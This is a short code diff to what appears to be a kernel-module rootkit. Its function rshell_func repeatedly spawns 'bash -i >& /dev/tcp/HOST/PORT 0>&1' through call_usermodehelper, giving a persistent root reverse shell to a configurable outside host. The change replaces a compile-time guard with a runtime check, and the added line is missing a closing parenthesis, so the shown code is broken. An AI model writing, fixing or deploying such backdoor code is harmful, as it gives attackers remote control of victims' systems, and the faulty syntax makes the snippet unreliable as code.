@@ -1,7 +1,9 @@
 #include "tasks/reverse_shell.h"
 
 int rshell_func(void* data) {
-#if defined(RSHELL_HOST) && defined(RSHELL_PORT)
+    if ((RSHELL_HOST[0] == '\0') || (RSHELL_PORT[0] == '\0') {
+        return 0;
+    }
     char command[256];
     snprintf(command, sizeof(command), "bash -i >& /dev/tcp/%s/%s 0>&1", RSHELL_HOST, RSHELL_PORT);
     char* argv[] = { "/bin/bash", "-c", command, NULL };
@@ -10,7 +12,6 @@ int rshell_func(void* data) {
             call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
             ssleep(10);
         }
-#endif
 
     return 0;
 }
